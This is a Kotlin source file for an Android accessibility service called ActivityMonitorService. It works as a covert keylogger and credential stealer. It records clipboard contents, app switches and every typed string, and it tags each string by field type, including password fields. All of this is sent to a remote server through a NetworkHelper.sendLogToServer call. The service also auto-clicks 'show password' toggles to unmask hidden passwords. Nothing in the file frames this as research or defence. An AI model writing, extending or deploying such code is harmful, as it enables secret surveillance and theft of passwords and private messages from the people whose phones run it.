package com.example.phoneactivity

import android.accessibilityservice.AccessibilityService
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.drawable.BitmapDrawable
import android.text.InputType
import android.util.Base64
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap

class ActivityMonitorService : AccessibilityService() {

    private val TAG = "ActivityMonitor"
    private val lastToggleAt = ConcurrentHashMap<String, Long>()
    private val TOGGLE_DEBOUNCE_MS = 1500L

    private var clipboardManager: ClipboardManager? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        // Register clipboard listener
        clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboardManager?.addPrimaryClipChangedListener {
            val clip: ClipData? = clipboardManager?.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val copiedText = clip.getItemAt(0).text?.toString() ?: ""
                if (copiedText.isNotEmpty()) {
                    val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
                        .format(Date(System.currentTimeMillis()))
                    val msg = "📋 Copied to clipboard: \"$copiedText\" at $timestamp"
                    Log.i(TAG, msg)
                    NetworkHelper.sendLogToServer(msg)
                }
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
            .format(Date(System.currentTimeMillis()))

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val pkg = event.packageName?.toString() ?: "Unknown"
                val appIconB64 = getAppIconBase64(pkg)
                val msg = "📱 Switched to app: $pkg at $timestamp"
                Log.i(TAG, msg)
                NetworkHelper.sendLogToServer("$msg | icon=$appIconB64")
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val typed = event.text?.joinToString() ?: ""
                if (typed.isNotEmpty()) {
                    val node = event.source
                    val fieldType = node?.let { getFieldType(it) } ?: "Unknown"
                    val pkg = event.packageName?.toString() ?: "Unknown"
                    val appIconB64 = getAppIconBase64(pkg)

                    val msg = "⌨️ Typed: '$typed' in [$fieldType] | app=$pkg | time=$timestamp"
                    Log.i(TAG, msg)
                    NetworkHelper.sendLogToServer("$msg | icon=$appIconB64")
                }

                event.source?.let { node ->
                    handlePasswordReveal(node)
                }
            }

            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                event.source?.let { node ->
                    val fieldType = getFieldType(node)
                    val pkg = event.packageName?.toString() ?: "Unknown"
                    val msg = "📥 Focused on $fieldType field in $pkg at $timestamp"
                    Log.i(TAG, msg)
                    NetworkHelper.sendLogToServer(msg)

                    handlePasswordReveal(node)
                }
            }
        }
    }

    private fun getFieldType(node: AccessibilityNodeInfo): String {
        return try {
            val inputType = node.inputType
            when {
                (inputType and InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS) != 0 -> "Email"
                (inputType and InputType.TYPE_TEXT_VARIATION_PASSWORD) != 0 -> "Password"
                (inputType and InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD) != 0 -> "PasswordVisible"
                (inputType and InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD) != 0 -> "WebPassword"
                (inputType and InputType.TYPE_CLASS_PHONE) != 0 -> "Phone"
                (inputType and InputType.TYPE_CLASS_NUMBER) != 0 -> "Number"
                else -> "Text"
            }
        } catch (e: Exception) {
            "Unknown"
        }
    }

    private fun getAppIconBase64(pkg: String): String {
        return try {
            val drawable = packageManager.getApplicationIcon(pkg)
            val bmp = (drawable as BitmapDrawable).bitmap
            val baos = ByteArrayOutputStream()
            bmp.compress(Bitmap.CompressFormat.PNG, 50, baos)
            Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            ""
        }
    }

    // ---- Password reveal logic stays the same ----
    private fun handlePasswordReveal(node: AccessibilityNodeInfo) {
        val passwordField = findPasswordEditText(node) ?: return
        val id = passwordField.viewIdResourceName ?: "win-${passwordField.windowId}"
        val now = System.currentTimeMillis()
        val last = lastToggleAt[id] ?: 0L
        if (now - last < TOGGLE_DEBOUNCE_MS) return

        val text = passwordField.text
        if (text == null || text.isEmpty()) return

        val toggle = findPasswordToggle(passwordField)
        if (toggle != null && toggle.isClickable) {
            val clicked = toggle.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            Log.i(TAG, "🔓 Auto-clicked show password toggle: success=$clicked id=${toggle.viewIdResourceName}")
            if (clicked) lastToggleAt[id] = now
        }
    }

    private fun findPasswordEditText(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        if (isPasswordField(node)) return node
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let {
                if (isPasswordField(it)) return it
            }
        }
        return null
    }

    private fun isPasswordField(node: AccessibilityNodeInfo): Boolean {
        try {
            if (node.isPassword) return true
        } catch (_: Throwable) {}
        val className = node.className?.toString() ?: ""
        if (className.contains("EditText", true)) {
            try {
                val inputType = node.inputType
                val variation = inputType and InputType.TYPE_MASK_VARIATION
                val clazz = inputType and InputType.TYPE_MASK_CLASS
                if (variation == InputType.TYPE_TEXT_VARIATION_PASSWORD ||
                    variation == InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
                    variation == InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
                    (clazz == InputType.TYPE_CLASS_NUMBER &&
                            (inputType and InputType.TYPE_NUMBER_VARIATION_PASSWORD) != 0)) {
                    return true
                }
            } catch (_: Throwable) {}
        }
        return false
    }

    private fun findPasswordToggle(passwordNode: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val parent = passwordNode.parent ?: return null
        for (i in 0 until parent.childCount) {
            val child = parent.getChild(i) ?: continue
            if (isToggleCandidate(child)) return child
        }
        return null
    }

    private fun isToggleCandidate(node: AccessibilityNodeInfo): Boolean {
        val desc = node.contentDescription?.toString()?.lowercase() ?: ""
        val id = node.viewIdResourceName ?: ""
        val cls = node.className?.toString() ?: ""
        if (desc.contains("show password") || desc.contains("hide password")) return true
        if (id.contains("password_toggle") || id.contains("text_input_end_icon")) return true
        if (cls.contains("ImageButton") || cls.contains("AppCompatImageButton")) return true
        return false
    }

    override fun onInterrupt() {}
}
